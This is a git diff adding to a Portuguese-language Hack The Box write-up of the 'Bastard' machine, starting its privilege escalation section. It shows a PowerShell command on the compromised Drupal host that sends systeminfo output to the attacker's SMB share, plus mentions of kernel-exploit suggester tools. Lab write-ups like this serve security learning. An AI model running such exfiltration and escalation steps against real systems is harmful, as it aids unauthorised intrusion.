@@ -95,3 +95,16 @@ Enfim pegamos nossa reverse shell
 ## Privilege Escalation
 
 Vamos comecar a sessao de PE e assim ter acesso de user e system
+
+![9.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/9.jpg)
+
+Continuando a busca por vetores de escalada, comeco sempre por kernel exploitation, vamos user o **wesng** e o **windows-exploit-suggester**
+
+Mas primeiro precisamos transferir o output do comando  **systeminfo** para nossa maquina.. usei o smbserver do impacket
+
+`PS C:\inetpub\drupal-7.54> systeminfo >> \\10.10.14.36\tools\systeminfo.txt`
+
+![10.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bastard/10.jpg)
+
+
+
